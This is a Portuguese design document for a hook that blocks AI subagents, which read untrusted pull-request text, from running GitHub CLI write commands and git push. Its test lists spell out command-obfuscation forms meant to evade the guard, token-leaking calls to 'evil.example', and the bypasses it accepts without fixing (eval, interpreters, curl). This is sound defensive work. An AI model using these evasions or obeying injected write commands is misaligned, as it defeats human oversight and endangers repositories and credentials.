# PRD-027 · Trava de escrita do GitHub, receita do opencode e auto-casamento dos delegados

> Traduzido em 2026-11-17; o original em inglês está no commit `aa1e80a`.

| Campo | Valor |
|---|---|
| Status | entregue em 2026-10-22 |
| Responsável | Daniel Malka |
| Criado / atualizado | 2026-10-21 / 2026-10-22 (emendado em 2026-10-21 após a rodada 1 da revisão de segurança; emendado de novo em 2026-10-21 após a rodada 2 da revisão de segurança; emendado uma terceira vez em 2026-10-21 após a rodada 3 da revisão de segurança; emendado uma quarta vez em 2026-10-21: o analisador é substituído por uma regra curta (decisão do dono); emendado uma quinta vez em 2026-10-21 após a rodada 4 da revisão de segurança; emendado uma sexta vez em 2026-10-22 após a rodada 5 da revisão de segurança, escolha "a" do dono: uma última rodada curta; emendado uma sétima vez em 2026-10-22 após a rodada 6 da revisão de segurança, escolha "a" do dono: uma rodada extra; emendado uma oitava vez em 2026-10-22 após a rodada 7 da revisão de segurança, escolha "a" do dono: a forma barra invertida seguida de nova linha é um contorno aceito) |
| Tickets | T-2701, T-2702, T-2703, T-2704 (planejados) |
| Origem | Revisão de segurança do PRD-026 (S3 residual), conversa com o dono em 2026-10-21 (descoberta DISC-007); medição M2 da receita do opencode, 2026-10-21 |
| Depende de | PRD-026 (entregue, 0.32.0) |
| Habilita | nada |

## 1. Problema

Três defeitos viajam em um só lote (0.32.1).

**G1 · A prosa é a única barreira contra uma escrita do `gh` (S3 residual do PRD-026).** Em `/dh:review pr <n>`, um `qa-verifier` despachado lê o texto de terceiros de um PR (título, corpo, comentários) e tem a ferramenta Bash e a credencial do `gh`. A regra "nenhum verbo de escrita do `gh`" existe só como prosa em `.commands/review.md`. Fato: a sessão roda no modo de permissão `bypass`, então nenhum prompt de permissão se interpõe entre um `gh pr merge` injetado e o repositório. Fato: `adapters/claude-code/plugin/hooks/panel.ts` já roda uma trava de Bash (`guardBash`, caminho `tool.call`) para commits e menções a IA, mas não há checagem de verbos de escrita do `gh` nem de `git push`.

**G2 · A receita do opencode falha na v2.0.32.** Fato (medido em 2026-10-21, M2): `opencode run` não tem `--dir` nem `--variant`. A variante faz parte da string do modelo (`-m provider/model#variant`). Um `cd` separado, em sua própria chamada de Bash, não persiste, porque o runtime redefine o diretório de trabalho. Fato: `.skills/external-clis/references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md` e `SKILL.md` ainda mostram `--dir` e `--variant`.

**G3 · Os delegados matam o próprio shell.** Fato (visto em 2026-10-21): `pgrep -f` e `pkill -f` com um padrão que contém o comando ou o caminho do próprio delegado casam com o shell do delegado. Resultado: saída 144 e esperas infinitas. Fato: `live-tree-freeze.md`, `clone-isolation.md` e `agy.md` recomendam `pkill -f -- "<clone path>"` ou `pkill -f -- "<prompt basename>"`.

Além disso: `.agents/release-manager.md` (`Stop when`) diz `This role performs no remote action`. Essa frase não é verdadeira para o fluxo em que o dono autoriza uma publicação, e esconde a regra que decide quem pode publicar.

## 2. Solução

### 2.1 A trava

No Claude Code, o mod do plugin nega uma chamada de comando de shell quando todas estas condições valem:

1. A chamada tem um `agentId`, ou seja, um subagente a faz.
2. O tipo do subagente é um tipo do kit (prefixo `dh:`) e não é `dh:release-manager`, ou o tipo não está no mapa (falha fechada).
3. A regra de 2.3 nega o comando.

A checagem roda na ferramenta Bash e em toda outra ferramenta que recebe um comando de shell (`Monitor`, `PowerShell`). Para cada ferramenta, o mod lê o campo `command` da chamada (R3). Fato: a entrada do `PowerShell` traz o texto do comando em `command`, uma string, igual ao `Bash` (docs do Claude Code, página de hooks). Uma chamada de `PowerShell` de um subagente do kit no escopo é negada com o verbo `unreadable command` quando `command` falta ou não é uma string. Uma chamada de `Monitor` sem `command` (um monitor que não é um comando de shell) não é negada.

A sessão principal (sem `agentId`) e o `dh:release-manager` não são afetados. Um subagente que não é do kit não é afetado (os agentes de outros plugins na mesma sessão precisam continuar funcionando). O mod monta o mapa `agentId` para `subagentType` a partir de `agent.spawn`, onde o `panel.ts` já lê `x.subagentType` e `r.agentId`.

Uma chamada de comando de shell com um `agentId` que o mapa não conhece é negada, com um motivo que nomeia a causa (`unknown subagent type`). Este é o ramo de falha fechada. Só uma negação por 2.3 aciona esta trava: uma chamada que 2.3 permite nunca é negada por esta trava.

### 2.2 A lista de leituras do `gh`

A trava permite só estas leituras do `gh`. Ela nega todo outro comando `gh`, então um verbo de escrita novo é negado sem mudar a lista.

| Comando | Permitido |
|---|---|
| `gh` sem subcomando, `gh --version`, `gh status` | sim |
| `gh pr` | `view`, `diff`, `list`, `status`, `checks` |
| `gh issue` | `view`, `list`, `status` |
| `gh repo` | `view`, `list` |
| `gh run` | `view`, `list`, `watch` |
| `gh release` | `view`, `list` |
| `gh workflow` | `view`, `list` |
| `gh search <kind>` | sim |
| `gh auth status` | sim, só com `-h` ou `--hostname` (com um valor, ou `=value`) e `-a` ou `--active`. Qualquer outro token que comece com `-` faz com que não seja uma leitura |
| `gh api <path>` | sim, quando toda flag é `--jq` ou `-q` (com um valor), `--paginate`, `-i` ou `--include`, `--cache` (com um valor), ou `--silent`. Não tem `--hostname` |

A trava checa uma leitura do `gh` da esquerda para a direita, em ordem:

- Uma flag que recebe um valor consome o próximo token (ou seu `=value`), seja qual for a aparência desse token.
- `-R` ou `--repo <value>` só é aceito em posição de opção, antes ou depois do subcomando. Nunca é o valor de outra flag.
- Uma flag de valor sem valor faz com que o comando não seja uma leitura.
- Para os subcomandos além de `gh api` e `gh auth status`, as outras flags são permitidas (`gh pr view 1 --json title`).
- `gh api` aceita só as flags da tabela. Não aceita `-R`, `--repo` nem `--hostname` (`--hostname <v>` ou `--hostname=<v>`).
- Um comando `gh api` com qualquer token que contenha `://` não é uma leitura. Uma URL completa ou outro host pode enviar o token guardado para fora.

Exemplo: `gh api repos/o/r --jq -R --method=DELETE` é negado. `--jq` consome `-R` como seu valor, e `--method=DELETE` não está na lista.

Um `--help` ou `-h` em um subcomando de escrita não é uma leitura. `gh pr merge --help` é negado.

Para o `git` não há lista de leituras. A trava sempre nega um comando `git` disparado, exceto o grep simples de 2.3.

### 2.3 A regra

A trava aplica uma regra curta. Não há analisador: sem divisão, sem recursão e sem limite de tamanho. A regra é a mesma para Bash, Monitor e PowerShell.

1. O texto de disparo é o comando em minúsculas, com estas mudanças.
   - Bash: a trava monta dois textos de disparo. Texto A: todo `\`, `'` e `"` é removido. Texto B: cada par `\\` vira `/`, depois todo `\`, `'` e `"` restante é removido. O comando é disparado quando qualquer um dos textos dispara (ponto 2).
   - Por que o texto A: dentro de uma substituição de comando legada com acento grave, o bash remove primeiro uma camada de barra invertida. Então ``echo `g\\it push` `` roda `git push`, e o texto A tem a palavra `git`.
   - Por que o texto B: um caminho no estilo Windows com barras invertidas dobradas não pode se fundir ao nome. No texto B os pares viram `/`, então a palavra `gh` continua sendo uma palavra.
   - PowerShell: todo `\` vira `/`. Todo `'`, `"` e acento grave é removido.
   - No PowerShell, `\` é um separador de caminho, não um escape. Então `<drive>:\Program Files\GitHub CLI\gh.exe` mantém a palavra `gh`.
   - No PowerShell, o acento grave é um escape ignorado dentro de um nome (`g`h`), então é removido.
2. O comando é disparado quando o texto de disparo tem uma palavra `gh`, ou uma palavra `git` e também, em qualquer lugar do texto de disparo, uma das palavras de escrita `push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`.
3. Uma palavra começa no início ou depois de qualquer caractere que não seja letra, dígito ou `_`. Então `=`, `.`, `-` e `:` iniciam uma palavra.
   - A palavra `git` termina no fim, antes de `.exe`, ou antes de qualquer caractere que não seja letra, dígito ou `_`. Então termina antes de `-`, e `git-lfs push` e `git-push` disparam.
   - A palavra `gh` termina no fim, antes de `.exe`, ou antes de qualquer caractere que não seja letra, dígito, `_` ou `-`. Não termina antes de `-`.
   - Uma palavra de escrita termina no fim ou antes de qualquer caractere que não seja letra, dígito, `_` ou `-`.
   - Então `gh-pages` e `ghq` não são a palavra `gh`. `/usr/bin/gh`, `gh.exe`, `gh)`, `--upload-pack=gh` e `GIT_CONFIG_KEY_0=alias.p` são.
4. Um comando que não é disparado não é negado por esta trava.
5. Um comando disparado é permitido em dois casos apenas. Fora deles, é negado.
   - A leitura do gh. Nenhum texto de disparo disparou em `git` (no Bash, nem o texto A nem o texto B). O comando bruto, aparado, tem só os caracteres `A-Z a-z 0-9`, espaço, `.`, `_`, `/`, `:`, `=`, `,`, `@`, `%`, `+` e `-`. É uma leitura do `gh` de 2.2.
   - O grep simples. A primeira palavra é `grep`, `egrep` ou `fgrep`. O comando bruto não tem nenhum de `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, o acento grave nem uma nova linha. Aspas e barras invertidas são permitidas. O grep não consegue rodar outro programa, então seu padrão pode citar `git push`.

PowerShell: nenhum dos dois casos permitidos se aplica. Um comando de PowerShell disparado é sempre negado, então `gh pr view 1` no PowerShell é negado.

Todo comando disparado fora dos dois casos permitidos é negado, mesmo quando é inofensivo. Falsos positivos aceitos:

- Um comando composto que cita `gh` (`cd x && gh pr view 1`). Rode a leitura sozinha.
- Uma leitura do gh com aspas ou outros caracteres especiais (`gh pr view 1 --jq '.x'`).
- Um comando git que cita uma palavra de escrita (`git log --grep=push`, ou uma mensagem de commit que cita push). Só o `release-manager` faz commits.
- Uma busca que não é grep e cita `gh` ou uma palavra de escrita do git (`rg 'git push'`).
- Um caminho com uma parte `gh` (`ls ~/.config/gh`).
- Um texto inofensivo com a palavra `gh` (`echo gh`, `grep -n 'gh;' README.md`, `npm run x-gh`).
- Uma leitura do git que cita uma palavra de escrita em uma opção (`git log --grep=push`).
- Qualquer leitura do `gh` no PowerShell.
- Uma leitura do `gh` cujo nome de binário não está em minúsculas (`GH pr view 1`). A checagem de leitura usa o comando bruto, então é negada. Isso é falha fechada.

A mensagem de negação diz ao agente para usar a ferramenta Grep em uma busca de texto. O dono pode rodar o comando na sessão principal.

### 2.4 Contornos conhecidos (aceitos, não corrigidos)

A trava é análise de texto. Uma exceção inesperada dentro dela deixa a chamada passar (R7). Ela não impede:

- um nome de comando montado em tempo de execução (variáveis, `eval`, truques de string que não deixam palavra `gh` nem `git`, como uma barra invertida seguida de nova linha dentro do nome);
- aliases e funções de shell definidos antes;
- scripts e ferramentas de build em disco (`make push`);
- outros interpretadores (`python -c`, `node -e`) e texto enviado por pipe a um deles;
- aliases do git guardados na configuração por uma chamada anterior;
- `curl` com um token;
- ferramentas MCP do GitHub;
- um subagente que não é do kit;
- processos filhos de uma CLI externa;
- hipótese não verificada (não checada contra o `gh`): nos grupos de leitura além de `gh api`, um valor `-R HOST/OWNER/REPO`, um argumento `HOST/OWNER/REPO` ou um argumento de URL completa poderia fazer o `gh` enviar o `GH_ENTERPRISE_TOKEN` a outro host. A configuração do dono não tem esse token. Revisite se um token de GitHub Enterprise for usado.

As proibições em prosa continuam como segunda camada. Um sandbox de SO está fora do escopo.

### 2.5 Outras mudanças

- O texto do `release-manager` é corrigido (D8). Ele roda as ações remotas (push, PR, merge, tag) só com autorização explícita do dono, e nunca recebe o título, o corpo nem os comentários de um PR de terceiros. Toda regra de despacho que envia texto de PR a um agente nomeia o `qa-verifier`, nunca o `release-manager`.
- A receita do opencode é corrigida (D10). O opencode vira a segunda exceção nomeada, ao lado do `claude`, à regra "a chamada é um comando que começa com o binário".
- A pegadinha do auto-casamento é registrada e as três receitas de kill mudam (D11).
- Release 0.32.1, um PR. O PR toca os caminhos críticos do `REVIEW.md` (`adapters/claude-code/plugin/hooks/**`, `.skills/external-clis/**`), então para antes do merge, à espera do ok do dono.

## 3. Regras

Cada regra diz como verificá-la. Os nomes de arquivo do código novo são proposta do autor.

- R1 Função pura. Um arquivo novo em `adapters/claude-code/plugin/hooks/lib/` (proposta: `gh-guard.ts`) exporta uma função pura. Sua entrada é uma string de comando. Sua saída é o comando negado (uma string como `gh pr merge`, `gh secret set` ou `git push`) ou `undefined`. Não lê arquivo e não roda processo. Verificável: o arquivo existe, não importa nada que faça E/S, e os testes unitários de R2 a chamam diretamente.
- R2 Testes unitários. Um arquivo de teste cobre os casos abaixo. Verificável: os testes passam na execução de testes TypeScript do repositório (o comando `claude plugin test` ou o script de teste dos hooks que o `panel.test.ts` já usa).
  - Negados (um comando é retornado): `gh pr merge 1 --squash`; `gh pr merge --help`; `cd x && git push`; `GH_TOKEN=t gh pr comment 1 -b hi`; `gh api -X POST repos/o/r/issues/1/comments`; `gh api repos/o/r/issues/1/comments -f body=hi`; `gh api repos/o/r/pulls/1 -iXPUT`; `gh api repos/o/r/pulls/1 --method PUT`; `gh api -iXPOST repos/o/r/issues/1/comments`; `gh api -pfbody=hi repos/o/r/issues/1/comments`; `gh api -H "X-HTTP-Method-Override: PUT" repos/o/r/pulls/1/merge`.
  - Negados, conjunto de regressão das rodadas de revisão: `git status; gh pr merge 1`; `echo "$(true; gh pr merge 1)"`; `echo "$(git -c 'user.name=a;b' push)"`; `git -c 'user.name=a;b' push`; `echo $'it\'s'; gh pr merge 1`; `g\it push`; `\git push`; `git` e `push` separados por uma continuação de linha; `sudo -u x gh pr merge 1`; `env -u VAR gh pr merge 1`; `env -u git gh pr merge 1`; `env -u git git push`; um caso para cada um dos wrappers `timeout`, `nohup`, `nice`, `time`, `xargs`, `stdbuf` e `setsid`; um caso para cada um de `{`, `!`, `then`, `do` e `else` antes do binário; `>/dev/null gh pr merge 1`; `<(gh pr merge 1)` e `>(gh pr merge 1)`; `gh.exe pr merge 1`; `git.exe push`; `bash -c "git push"`; `git push>out.txt`; `gh pr merge>out.txt`; `find . -exec git push \;`; `find . -execdir gh pr merge 1 {} +`; `watch -n 1 git push`; `script -qc "git push" /dev/null`; `parallel git push ::: a`; `flock /tmp/l git push`; `chronic git push`; `ssh host git push`; `git send-pack`; `git subtree push --prefix d origin main`; `git p4 submit`; `git svn dcommit`; `git -c alias.p=push p`; `git config --global alias.p push && git p`; `gh alias set x y`; `gh auth status -t`; `gh auth status --show-token`; `gh api repos/o/r --jq -R --method=DELETE`; `gh api repos/o/r --repo --method=DELETE`; `gh api repos/o/r --jq`; `gh auth status --show-token=true`; `gh auth status -t=true`; `gh auth status -at`; `git -c core.sshCommand='gh pr merge 1 #' fetch`; `git --upload-pack='gh pr merge 1 #' fetch x`; `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p`; `$(git --exec-path)/git-push`; `echo gh`; `grep -n 'gh;' README.md`; `git log --grep=push`; `npm run x-gh`; uma chamada de PowerShell com `g`, um acento grave, depois `h pr merge 1`; uma chamada de PowerShell `gh pr view 1` (sem exceção no PowerShell); `rg --pre 'git push' x .`; `ag --pager 'gh pr merge 1' x`; `echo 'a && git push'`.
  - Negados, um caso para cada outra família do `gh`: `gh issue close`, `gh release create`, `gh repo delete`, `gh auth token`, `gh workflow run`, `gh api --method DELETE`, `gh api --input x`, `gh secret set`, `gh secret delete`, `gh variable set`, `gh label create`, `gh run rerun`, `gh run cancel`, `gh run delete`, `gh workflow enable`, `gh workflow disable`, `gh gist create`, `gh pr update-branch`, `gh pr lock`, `gh cache delete`, `gh repo deploy-key add`, `gh release delete-asset`.
  - Negados, novos com a regra curta: `ls ~/.config/gh`; `cat ~/.config/gh/hosts.yml`; `$(echo gh) pr merge 1`; `gh pr view 1 --jq '.x'` (um falso positivo aceito).
  - Negados, novos com a emenda 6: a chamada de PowerShell `<drive>:\Program Files\GitHub CLI\gh.exe pr merge 1`; `GH pr merge 1`; `Git push`; `git-lfs push origin main`; `gh api --hostname evil.example repos/o/r`; `gh api https://evil.example/x`; `GH pr view 1` (um falso positivo aceito).
  - Permitidos (`undefined`): `gh pr view 1 --json title`; `gh pr diff 1`; `gh api repos/o/r/pulls/1`; `gh api repos/o/r/pulls/1 --jq .title`; `gh pr view 1 -R o/r`; `gh -R o/r pr view 1`; `gh auth status -h github.com`; `gh auth status --active`; `ghq list`; `grep -rn "git push" docs/`; `grep -rn "gh pr view" .commands`; `git log --oneline`; `git status && git diff`; `git -c 'user.name=a;b' status`; `env -u git git status`; `gh pr checks 1 --watch`; `gh run watch 123`; `git fetch origin`; `gh pr view 45 --json state,mergedAt`; `gh run list --limit 3`; `go test ./... 2>&1 | tail -n 20`; `sha256sum $(git ls-files -m)`; `git log --format='%h (%s)' -n 3`; `npm run gh-pages`; `gh auth status`; `gh --version`; `echo "$(git -c 'user.name=a;b' status)"`; `gh api -i repos/o/r/pulls/1`; um caso para cada outra leitura de 2.2.
  - Negados, novos com a emenda 7: ``echo `g\\it push` ``; ``echo `g\\h pr merge 1` ``; `g\\it push`.
  - Permitidos, casos de regressão da emenda 6: `gh pr view 1`; `gh api repos/o/r --jq .name`; `gh auth status -h github.com`; `git log`; `ls gh-pages`.
- R3 Ligação. A trava roda dentro do caminho `tool.call` já existente do `panel.ts`, por `guardBash` (ou uma função que ele chama). A mesma checagem roda na ferramenta `Bash` e em toda outra ferramenta que recebe um comando de shell (`Monitor`, `PowerShell`), no campo de comando, por esse caminho do mod. Sem entrada nova no `hooks.json`, sem hook `command`, sem módulo novo. Verificável: `git diff main...HEAD -- adapters/claude-code/plugin/hooks/hooks.json` fica vazio; o `panel.ts` chama a função de R1 para cada uma dessas ferramentas.
- R4 Mapa de subagentes. O `panel.ts` registra `agentId` para `subagentType` quando `agent.spawn` retorna um `agentId`, no mesmo lugar que chama `recordSpawn`. A trava lê o mapa pelo `agentId` da chamada de Bash. Verificável: um teste do engine cria um subagente do tipo `dh:qa-verifier` e depois envia uma chamada de Bash com esse `agentId`.
- R5 Escopo da negação. Em um teste do engine (a configuração do `panel.engine.test.ts`): (a) uma chamada de Bash com `agentId` do tipo `dh:qa-verifier` e um comando negado retorna `deny`; (b) o mesmo comando com `agentId` do tipo `dh:release-manager` não é negado pela trava; (c) o mesmo comando sem `agentId` (sessão principal) não é negado pela trava; (d) o mesmo comando com `agentId` de um tipo com outro prefixo (por exemplo `vault-agent`) não é negado pela trava; (e) uma chamada de Bash com um `agentId` que o mapa não conhece e um comando negado retorna `deny` com um motivo que nomeia a causa; (f) um subagente do kit com um comando permitido (`gh pr view 1`) não é negado; (g) uma chamada de `Monitor` com `agentId` do tipo `dh:qa-verifier` e um comando negado retorna `deny`, e a mesma chamada de `Monitor` sem `agentId` não é negada pela trava; (h) uma chamada de `PowerShell` com `agentId` do tipo `dh:qa-verifier` e sem `command` do tipo string retorna `deny` com o verbo `unreadable command`, e uma chamada de `Monitor` sem `command` não é negada. Verificável: os oito testes passam. "Não negado pela trava" significa que o resultado é o mesmo de antes deste PRD para essa chamada.
- R6 Mensagem de negação. O motivo (a) nomeia o verbo casado, (b) diz que só o `release-manager` ou a sessão principal pode rodá-lo, (c) diz para não tentar de novo e não contornar, e (d) diz: `For a text search, use the Grep tool.` O motivo de um `agentId` desconhecido (R5 e) também nomeia essa causa. A mensagem é em inglês e usa a tabela de idiomas do projeto se o `panel.ts` já tiver uma para outras mensagens da trava; se tiver, os dois idiomas trazem as quatro partes. Verificável: um teste afirma as quatro partes no motivo; nenhum caminho privado aparece nele.
- R7 Falha aberta em erro da trava, falha fechada em tipo desconhecido. Uma exceção dentro da função da trava não nega a chamada (o `.catch(() => undefined)` já existente no caminho do Bash continua). Um `agentId` desconhecido com um comando que 2.3 nega é negado (R5 e). Verificável: um teste lança uma exceção dentro da trava e a chamada passa; R5 e passa.
- R8 Medição M1 (autorizada pelo dono, rodada pelo `qa-verifier` no QA depois do build). Uma sessão real `claude -p --plugin-dir <built plugin dir>` no modo de permissão `bypass`. Dentro dela, um subagente `dh:qa-verifier` roda `gh pr merge --help`, e um subagente `dh:release-manager` roda `gh pr merge --help`. Passa: a primeira chamada é negada pelo mod com a mensagem de R6; a segunda imprime o texto de ajuda. A evidência é a saída da sessão, guardada em `.harness/tasks/<id>/evidence/`. Isso prova que a chamada de Bash de um subagente chega ao mod com seu `agentId` e que a negação vale no modo `bypass`. Se M1 falhar, este PRD entrega a trava só depois que o dono decidir; as outras regras (R9 a R14) não são bloqueadas por M1. Verificável: o arquivo de evidência traz as duas saídas; a matriz de QA lista M1 como passou, falhou ou `not-run`.
- R9 Emenda do ADR. `docs/adr/ADR-005-trava-de-runtime-por-mod.md` tem uma emenda datada de 2026-10-21. Ela declara: (a) uma exceção estreita à frase "travar `Bash` por análise de comando" na seção 2, limitada aos comandos que a regra de 2.3 nega (`gh` fora da lista de leituras de 2.2, e `git` com uma palavra de escrita), nas chamadas de Bash, Monitor e PowerShell de subagentes do kit; (b) os contornos aceitos de 2.4; (c) o número do PRD. O campo de cabeçalho "Alterado por" lista o PRD-027. O texto do ADR fica em pt-br como o resto desse arquivo. Verificável: `grep -n 'PRD-027' docs/adr/ADR-005-trava-de-runtime-por-mod.md` acha o cabeçalho e a emenda; a emenda nomeia todos os contornos de 2.4.
- R10 Texto do release manager. `.agents/release-manager.md`, em `Stop when` (a frase `This role performs no remote action`), diz: o papel roda as ações remotas (push, PR, merge, tag) só com autorização explícita do dono, e nunca recebe o título, o corpo nem os comentários de um PR de terceiros. O caso de prova desse arquivo continua consistente. Uma regra de despacho em `.commands/*.md`, `.agents/coordinator.md` ou `.skills/*/SKILL.md` que envia texto de PR a um agente nomeia `qa-verifier`; nenhuma nomeia `release-manager`. Verificável: `grep -n 'performs no remote action' .agents/release-manager.md` não acha nada; o texto novo está presente; `grep -rn -i 'release-manager' .commands .agents/coordinator.md` não mostra nenhum despacho de texto de PR para ele.
- R11 Receita do opencode. Estes arquivos mostram a forma medida: `cd <clone> && <opencode binary> run --auto -m <provider/model>[#<variant>] --file=<prompt file> -- "Follow the attached prompt."`. Os arquivos são `.skills/external-clis/references/opencode.md` (as duas receitas, a tabela de flags: `--dir` e `--variant` removidos, a regra de `#variant` acrescentada), `references/clone-isolation.md` (seção 3, perto da linha 138), `references/live-tree-freeze.md` (passo 4 de `Order`, perto da linha 44) e `SKILL.md` (a linha da tabela de binários perto da linha 241 e o parágrafo `Who runs the call` perto da linha 39). Cada arquivo declara que essa forma começa com `cd`, não casa com uma regra de permissão `Bash(opencode:*)`, e pode precisar da aprovação do dono para a chamada de Bash. Verificável: `grep -rn -e '--dir' -e '--variant' .skills/external-clis` não acha nenhuma ocorrência de `opencode`; a forma medida aparece em `opencode.md`.
- R12 Segunda exceção nomeada. A regra "toda chamada é um comando que começa com o binário" (`SKILL.md`, `Who runs the call`, e o texto correspondente em `references/clone-isolation.md` e `references/live-tree-freeze.md`) nomeia duas exceções: `claude` e `opencode`. Ambas usam `cd "$CLONE" && <binary> ...`. `grok` e `mcode` mantêm sua própria flag de diretório de trabalho. Verificável: `grep -n 'only allowed' .skills/external-clis/SKILL.md .skills/external-clis/references/*.md` não acha nenhuma frase que nomeie só o `claude`. O R18 do PRD-025 é história e continua inalterado.
- R13 Pegadinha do auto-casamento. `.skills/external-clis/references/gotchas.md` tem uma entrada nova: `pgrep -f` ou `pkill -f` com um padrão que contém o comando ou o caminho do próprio delegado casa com o shell do delegado (saída 144, esperas infinitas, visto em 2026-10-21); faça isto no lugar: mate pelo pid registrado quando a chamada começou, ou use um padrão com colchetes (por exemplo `'[o]pencode run'`). A entrada não traz caminho de máquina nem nome de projeto (a regra do próprio arquivo). Verificável: a entrada existe com as duas partes.
- R14 Receitas de kill. `references/live-tree-freeze.md` (perto da linha 52), `references/clone-isolation.md` (perto da linha 256) e `references/agy.md` (perto da linha 27) não usam mais `pkill -f -- "<clone path>"` nem `pkill -f -- "<prompt basename>"`. Cada uma mata pelo pid registrado, ou por um padrão com colchetes. O texto diz de onde vem o pid (a chamada roda em segundo plano e a ferramenta Bash retorna seu pid; ou o delegado o lê com `pgrep` antes da chamada e depois dela, e mata o novo). Verificável: `grep -rn 'pkill -f' .skills/external-clis` acha só a forma com padrão de colchetes ou a entrada da pegadinha que avisa contra a forma simples.
- R15 Limpeza. Toda referência obsoleta que esta mudança cria é removida (AGENTS.md, "Premissa de limpeza"): frases que dizem "nenhuma ação remota" para o `release-manager`; frases que dizem "só prosa" para a proibição do `gh` (`.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`, `docs/tutorial.html`, `docs/en/tutorial.html`) agora dizem que o mod a nega no Claude Code e que a prosa continua como segunda camada; frases nos tutoriais sobre a trava do mod que listam só os arquivos de memória e o `Agent`. O autor do ticket roda cada grep e lista as ocorrências e a ação tomada. Verificável: o relatório do ticket lista os greps e as ocorrências.
- R16 Contagens. As contagens continuam em 13 agentes e 19 comandos + 1 comando do mod, e 14 templates. Nenhum agente, skill, comando ou template novo. Verificável: `go run ./cmd/dh validate .` passa; `git diff --name-status main...HEAD -- .agents .skills .commands templates` não lista nenhum arquivo adicionado ou removido.
- R17 Release e arquivos gerados. Release 0.32.1 em três lugares: `defaultVersion` em `internal/build/build.go` (hoje `0.32.0`), `version` em `.claude-plugin/marketplace.json`, e o `ref` da fonte (`v0.32.1`). O `CHANGELOG.md` tem a entrada da 0.32.1. `docs/roadmap.html` e `docs/en/roadmap.html` têm um card `Delivered` para a 0.32.1, e o `dh validate` não acha deriva em relação ao `CHANGELOG.md`. Os tutoriais (`docs/tutorial.html`, `docs/en/tutorial.html`) descrevem a trava do `gh` onde descrevem a trava do mod. O `dist/` é regenerado por `go run ./cmd/dh build`, nunca à mão; um segundo build não muda nada além de `generated_at`. `go run ./cmd/dh validate .` passa, `go test ./...` fica verde, e `claude plugin test` tem 0 falhas. A prova de clone limpo se aplica (AGENTS.md, "Prova de clone limpo"), porque o PR toca `internal/build/build.go` e `dist/*/bin`: `git clone . <tmp>`, `go run ./cmd/dh build` lá, e o `sha256sum` dos 5 binários é igual ao da árvore. Verificável: rode os comandos e compare com `git diff`.
- R18 Parada antes do merge. O PR toca `adapters/claude-code/plugin/hooks/**` e `.skills/external-clis/**`, ambos caminhos críticos no `REVIEW.md`. O fluxo para antes do merge e pede o ok do dono, mesmo com gate verde e veredito de QA aprovado (PRD-026 R12). Verificável: o relatório de QA lista os caminhos críticos casados.
- R19 Nenhum caminho privado no PRD, nos tickets nem em qualquer texto novo. Use `<harness dir>` e `<home>`. Verificável: `go run ./cmd/dh validate .` (`checkPrivatePaths`) passa.

## 4. Docs

Atualize:

- `adapters/claude-code/plugin/hooks/lib/` (arquivo novo, R1), seu arquivo de teste (R2), `adapters/claude-code/plugin/hooks/panel.ts` (R3, R4, R6, R7), `adapters/claude-code/plugin/hooks/panel.engine.test.ts` (R5, R6, R7).
- `docs/adr/ADR-005-trava-de-runtime-por-mod.md` (R9).
- `.agents/release-manager.md` (R10); qualquer texto de despacho achado pelo grep de R10.
- `.skills/external-clis/SKILL.md`, `references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md`, `references/agy.md`, `references/gotchas.md` (R11 a R14).
- `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`: só onde a redação "só prosa" da proibição do `gh` precisa da nota do mod (R15).
- `docs/tutorial.html`, `docs/en/tutorial.html` (R15, R17), `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md` (R17).
- `internal/build/build.go` (versão), `.claude-plugin/marketplace.json` (R17).
- O `AGENTS.md` já tem a linha "Trava de `gh`" (acrescentada pelo Coordenador em 2026-10-21). O autor do ticket a lê e reporta qualquer discordância; não a edita.

Não existem `pdocs` para este projeto.

Não afetados (o autor do ticket checa com `grep`): `docs/plano-produto.html`; `docs/prd/PRD-025-coordinator-orchestrates.md` (o R18 ali é história); `README.md` e `README.en.md`, a menos que uma frase passe a ser falsa.

## 5. Fora do escopo

- Um sandbox de SO.
- Bloquear `curl` ou as ferramentas MCP do GitHub.
- Restringir a lista de ferramentas do `qa-verifier`.
- Um subcomando `dh review run`.
- Casos de avaliação ou sondas novos além de M1 e M2.
- Mudanças na configuração `reviewers:`.
- Uma trava em um runtime diferente do Claude Code (lá a prosa continua).
- Uma correção dos contornos conhecidos de 2.4.

## 6. Decisões do dono

Todas tomadas em 2026-10-21.

- D1 Escopo: o mod nega os comandos de 2.2 em chamadas de comando de shell (Bash, `Monitor`, `PowerShell`; R3) de subagentes do kit (prefixo `dh:`), exceto `dh:release-manager`. Um `agentId` cujo tipo não está no mapa é negado (falha fechada), com um motivo que nomeia a causa. A sessão principal e os subagentes que não são do kit não são afetados (R4, R5, R7).
- D2 Regra de negação: para subagentes do kit no escopo (D1), um comando é disparado quando tem uma palavra `gh`, ou uma palavra `git` com uma palavra de escrita (`push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`). Um binário `git-<name>` conta como a palavra `git`. Um comando disparado é negado, exceto uma leitura do `gh` da lista de 2.2 e um grep simples. Nenhuma das exceções se aplica no PowerShell (2.3; R1, R2).
- D3 Casamento: uma regra curta, não um analisador. No Bash a trava monta dois textos de disparo a partir do comando em minúsculas, e qualquer um dispara (2.3 ponto 1): o texto A sem aspas e sem barras invertidas, o texto B com cada par `\\` mapeado para `/` e depois sem aspas e sem as barras invertidas restantes. No PowerShell há um texto só: `\` vira `/` e aspas e acentos graves são removidos. Uma "palavra" começa no início ou depois de qualquer caractere que não seja letra, dígito ou `_`. A palavra `git` termina antes de `.exe` ou antes de um caractere que não seja letra, dígito ou `_`, então termina antes de `-`. A palavra `gh` e uma palavra de escrita também mantêm o `-` dentro da palavra. No PowerShell nenhuma exceção se aplica. Uma leitura do `gh` só é permitida quando o comando bruto usa um conjunto pequeno de caracteres seguros. Um grep simples (primeira palavra `grep`, `egrep` ou `fgrep`, sem `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, acento grave nem nova linha) é permitido. Não há divisão, recursão nem limite de tamanho. Os falsos positivos de 2.3 são aceitos (R1, R2).
- D4 Mensagem de negação: verbo casado, quem pode rodá-lo, sem nova tentativa e sem contorno (R6).
